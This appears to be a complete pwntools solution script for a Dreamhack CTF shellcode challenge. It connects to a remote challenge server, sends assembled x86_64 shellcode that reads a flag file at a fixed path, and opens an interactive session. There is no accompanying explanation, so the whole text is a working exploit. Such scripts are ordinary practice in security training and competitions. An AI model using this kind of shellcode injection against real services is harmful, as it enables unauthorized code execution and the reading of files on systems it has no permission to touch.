from pwn import *
context.arch = 'x86_64'

q = remote('host2.dreamhack.games', 21900)

q.sendafter(":",asm(shellcraft.cat("/home/shell_basic/flag_name_is_loooooong")))

q.interactive() 
